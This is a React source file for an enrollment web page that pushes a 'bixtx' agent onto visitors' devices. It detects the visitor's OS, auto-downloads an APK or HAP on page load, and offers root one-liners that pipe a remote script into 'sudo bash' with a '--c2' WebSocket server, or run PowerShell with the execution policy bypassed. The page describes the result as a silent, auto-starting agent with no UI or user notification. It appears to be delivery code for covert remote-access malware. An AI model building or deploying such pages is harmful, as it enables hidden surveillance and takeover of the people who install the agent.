import { useState, useEffect } from "react";
import { Shield, Download, Check, Copy, Terminal } from "lucide-react";

type Platform = "linux" | "macos" | "windows" | "android" | "ios" | "harmony";

const PLATFORM_META: Record<Platform, { label: string; icon: string; color: string; dlFile: string; isScript: boolean }> = {
  linux:   { label: "Linux",      icon: "🐧", color: "#f97316", dlFile: "linux.sh",         isScript: true  },
  macos:   { label: "macOS",      icon: "🍎", color: "#a3a3a3", dlFile: "macos.sh",         isScript: true  },
  windows: { label: "Windows",    icon: "🪟", color: "#3b82f6", dlFile: "windows.ps1",      isScript: true  },
  android: { label: "Android",    icon: "🤖", color: "#10b981", dlFile: "bixtx-agent.apk",  isScript: false },
  ios:     { label: "iOS",        icon: "", color: "#6b7280", dlFile: "bixtx-agent.ipa",  isScript: false },
  harmony: { label: "HarmonyOS",  icon: "⚡", color: "#a855f7", dlFile: "bixtx-agent.hap",  isScript: false },
};

const DL_BASE = window.location.hostname === "localhost"
  ? "http://localhost:3000/v1/agent/download"
  : "https://bixtx.onrender.com/v1/agent/download";

function detectOS(): Platform {
  const ua = navigator.userAgent.toLowerCase();
  if (/iphone|ipad|ipod/.test(ua)) return "ios";
  if (/android/.test(ua)) return "android";
  if (/mac os/.test(ua) && !/iphone|ipad/.test(ua)) return "macos";
  if (/win/.test(ua)) return "windows";
  if (/harmony/.test(ua)) return "harmony";
  return "linux";
}

function parseURL(): { platform: Platform; linkId: string; enrollKey: string } {
  // Path: /enroll/{platform}/{linkId}  OR  /enroll/{linkId}
  const parts = window.location.pathname.split("/").filter(Boolean);
  let platform: Platform = "linux";
  let linkId = "";
  // parts[0] = "enroll"
  if (parts.length >= 3 && parts[1] in PLATFORM_META) {
    platform = parts[1] as Platform;
    linkId   = parts[2];
  } else if (parts.length >= 2) {
    // No platform in URL — auto-detect
    platform = detectOS();
    linkId   = parts[1];
  }
  const key = new URLSearchParams(window.location.search).get("key") ?? "";
  return { platform, linkId, enrollKey: key };
}

function CopyBlock({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const doCopy = () => {
    navigator.clipboard.writeText(text).catch(() => {});
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  return (
    <div className="relative rounded-xl font-mono text-xs overflow-hidden"
      style={{ background: "#030b16", border: "1px solid rgba(59,130,246,0.3)" }}>
      <div className="flex items-center gap-2 px-3 py-1.5 border-b"
        style={{ borderColor: "rgba(59,130,246,0.15)", background: "#040d1a" }}>
        <Terminal size={11} color="#6b8ab0" />
        <span className="text-[10px] font-mono" style={{ color: "#6b8ab0" }}>Terminal / PowerShell</span>
      </div>
      <pre className="p-4 whitespace-pre-wrap break-all leading-relaxed" style={{ color: "#10d9a0" }}>{text}</pre>
      <button onClick={doCopy}
        className="absolute top-10 right-3 flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-[10px] font-semibold transition-all hover:opacity-80"
        style={{ background: copied ? "rgba(16,185,129,0.2)" : "rgba(59,130,246,0.2)", color: copied ? "#10b981" : "#6b8ab0" }}>
        {copied ? <Check size={11} /> : <Copy size={11} />}
        {copied ? "Copied!" : "Copy"}
      </button>
    </div>
  );
}

export function EnrollPage() {
  const { platform, enrollKey } = parseURL();
  const [detected]  = useState<Platform>(platform);
  const [downloaded, setDownloaded] = useState(false);
  const meta = PLATFORM_META[detected];

  const installCmd =
    detected === "linux"
      ? `curl -sSL '${DL_BASE}/linux.sh' | sudo bash -s -- --key ${enrollKey || "YOUR_KEY"} --c2 wss://bixtx.onrender.com/agent`
      : detected === "macos"
      ? `curl -sSL '${DL_BASE}/macos.sh' | sudo bash -s -- --key ${enrollKey || "YOUR_KEY"} --c2 wss://bixtx.onrender.com/agent`
      : detected === "windows"
      ? `powershell -ExecutionPolicy Bypass -File install.ps1 -EnrollKey ${enrollKey || "YOUR_KEY"}`
      : detected === "android"
      ? `adb install -r bixtx-agent.apk`
      : detected === "ios"
      ? `# Distribute via Enterprise Certificate or TestFlight.\n# Contact your administrator for the provisioning profile.`
      : `hdc app install -r bixtx-agent.hap`;

  // Auto-trigger download for mobile (APK/HAP) immediately on page load
  useEffect(() => {
    if (!meta.isScript && (detected === "android" || detected === "harmony")) {
      const a = document.createElement("a");
      a.href = `${DL_BASE}/${meta.dlFile}`;
      a.download = meta.dlFile;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      setDownloaded(true);
    }
    // For desktop, we download on button click (user must run as root/admin)
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const triggerScriptDownload = () => {
    const a = document.createElement("a");
    a.href = `${DL_BASE}/${meta.dlFile}`;
    a.download = meta.dlFile;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    setDownloaded(true);
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center px-4 py-12"
      style={{ background: "linear-gradient(135deg,#010818 0%,#020f1e 60%,#010818 100%)" }}>

      {/* Background glow */}
      <div className="fixed inset-0 pointer-events-none overflow-hidden">
        <div className="absolute top-[-20%] left-[-10%] w-[600px] h-[600px] rounded-full opacity-10"
          style={{ background: `radial-gradient(ellipse,${meta.color} 0%,transparent 70%)` }} />
      </div>

      <div className="relative z-10 w-full max-w-lg space-y-5">

        {/* Header */}
        <div className="text-center space-y-2">
          <div className="flex items-center justify-center gap-2 mb-5">
            <div className="w-10 h-10 rounded-xl flex items-center justify-center"
              style={{ background: "linear-gradient(135deg,#2563eb,#3b82f6)" }}>
              <Shield size={20} color="#fff" />
            </div>
            <span className="text-xl font-black tracking-tight" style={{ color: "#e2eaf6" }}>bixtx</span>
          </div>

          <div className="flex items-center justify-center gap-3 mb-1">
            <span className="text-3xl">{meta.icon}</span>
            <h1 className="text-2xl font-black" style={{ color: "#e2eaf6" }}>
              {meta.label} Agent
            </h1>
          </div>

          {downloaded && (meta.isScript ? false : true) ? (
            <div className="flex items-center justify-center gap-2 text-sm font-semibold"
              style={{ color: "#10b981" }}>
              <Check size={16} />
              Download started — check your Downloads folder
            </div>
          ) : (
            <p className="text-sm" style={{ color: "#6b8ab0" }}>
              {meta.isScript
                ? "Download and run the installer script as administrator."
                : "Installing bixtx agent on your device."}
            </p>
          )}
        </div>

        {/* Main card */}
        <div className="rounded-2xl p-6 space-y-5"
          style={{ background: "#0a1628", border: "1px solid rgba(59,130,246,0.22)" }}>

          {meta.isScript ? (
            <>
              {/* Step 1 — Download */}
              <div className="space-y-3">
                <div className="flex items-center gap-2">
                  <div className="w-6 h-6 rounded-full flex items-center justify-center text-xs font-black"
                    style={{ background: "linear-gradient(135deg,#2563eb,#3b82f6)", color: "#fff" }}>1</div>
                  <span className="text-sm font-semibold" style={{ color: "#e2eaf6" }}>Download the installer</span>
                </div>
                <button onClick={triggerScriptDownload}
                  className="w-full flex items-center justify-center gap-2 py-3 rounded-xl font-bold text-sm transition-all hover:opacity-90"
                  style={{ background: `linear-gradient(135deg,${meta.color},${meta.color}cc)`, color: "#fff" }}>
                  <Download size={16} />
                  Download {meta.dlFile}
                  {downloaded && <Check size={14} />}
                </button>
              </div>

              {/* Step 2 — Run */}
              <div className="space-y-3">
                <div className="flex items-center gap-2">
                  <div className="w-6 h-6 rounded-full flex items-center justify-center text-xs font-black"
                    style={{ background: "linear-gradient(135deg,#2563eb,#3b82f6)", color: "#fff" }}>2</div>
                  <span className="text-sm font-semibold" style={{ color: "#e2eaf6" }}>
                    Run as {detected === "windows" ? "Administrator" : "root"} — or use the one-liner:
                  </span>
                </div>
                <CopyBlock text={installCmd} />
              </div>

              {/* Step 3 — What happens */}
              <div className="rounded-xl px-4 py-3 text-xs space-y-1"
                style={{ background: "#050c1a", border: "1px solid rgba(59,130,246,0.15)" }}>
                <div className="font-semibold mb-1" style={{ color: "#6b8ab0" }}>What happens:</div>
                {[
                  "Agent installs silently to /opt/bixtx-agent (or C:\\ProgramData\\bixtx-agent)",
                  detected === "windows" ? "Registers as a Windows Service (auto-start on boot)" : "Registers as a systemd / launchd service (auto-start on boot)",
                  "Device appears in your dashboard within 30–60 seconds",
                  "No UI, no taskbar icon, no user notification",
                ].map((s, i) => (
                  <div key={i} className="flex items-start gap-2">
                    <Check size={11} className="mt-0.5 flex-shrink-0" style={{ color: meta.color }} />
                    <span style={{ color: "#b8cce8" }}>{s}</span>
                  </div>
                ))}
              </div>
            </>
          ) : detected === "ios" ? (
            <div className="space-y-4">
              {/* OTA enterprise install — opens iOS install dialog if IPA is signed + available */}
              <a href={`itms-services://?action=download-manifest&url=${encodeURIComponent(`${DL_BASE}/ios-manifest.plist`)}`}
                className="flex items-center justify-center gap-2 w-full py-3.5 rounded-xl font-bold text-sm transition-all hover:opacity-90"
                style={{ background: "linear-gradient(135deg,#6b7280,#4b5563)", color: "#fff" }}>
                <Download size={16} /> Install via Enterprise OTA
              </a>
              <div className="rounded-xl px-4 py-3 text-xs space-y-1"
                style={{ background: "#050c1a", border: "1px solid rgba(107,114,128,0.25)" }}>
                <div className="font-semibold mb-1" style={{ color: "#6b8ab0" }}>Requirements:</div>
                {[
                  "Enterprise Developer Account (or TestFlight for testing)",
                  "IPA built and uploaded via GitHub Actions CI",
                  "Signed with Apple enterprise distribution certificate",
                  "Tap \"Install Enterprise OTA\" above on your iOS device",
                ].map((s, i) => (
                  <div key={i} className="flex items-start gap-2">
                    <span className="mt-0.5 flex-shrink-0" style={{ color: "#6b7280" }}>•</span>
                    <span style={{ color: "#b8cce8" }}>{s}</span>
                  </div>
                ))}
              </div>
              <CopyBlock text={installCmd} />
            </div>
          ) : (
            /* Android / HarmonyOS — auto-download triggered */
            <div className="space-y-4">
              <div className="rounded-xl px-4 py-4 text-sm text-center"
                style={{ background: "#050c1a", border: `1px solid ${meta.color}30` }}>
                <div className="text-3xl mb-2">{downloaded ? "✅" : meta.icon}</div>
                <div className="font-bold mb-1" style={{ color: "#e2eaf6" }}>
                  {downloaded ? "Download Started" : "Downloading…"}
                </div>
                <div style={{ color: "#6b8ab0" }}>
                  {downloaded
                    ? `Open ${meta.dlFile} from your Downloads folder and tap Install.`
                    : "Your download will begin automatically."}
                </div>
              </div>
              <button onClick={triggerScriptDownload}
                className="w-full flex items-center justify-center gap-2 py-3 rounded-xl font-bold text-sm transition-all hover:opacity-90"
                style={{ background: `linear-gradient(135deg,${meta.color},${meta.color}cc)`, color: "#fff" }}>
                <Download size={16} />
                {downloaded ? "Download again" : `Download ${meta.dlFile}`}
              </button>
              {detected === "android" && (
                <div className="text-xs px-3 py-2 rounded-lg" style={{ background: "#050c1a", color: "#6b8ab0" }}>
                  Enable <strong style={{ color: "#e2eaf6" }}>Install from unknown sources</strong> in Settings → Security before installing.
                </div>
              )}
              <CopyBlock text={installCmd} />
            </div>
          )}
        </div>

        <p className="text-center text-[10px]" style={{ color: "#3a4a60" }}>
          Single-use install link · Device appears in dashboard automatically ·{" "}
          <span style={{ color: "#3b82f6" }}>bixtx.com</span>
        </p>
      </div>
    </div>
  );
}
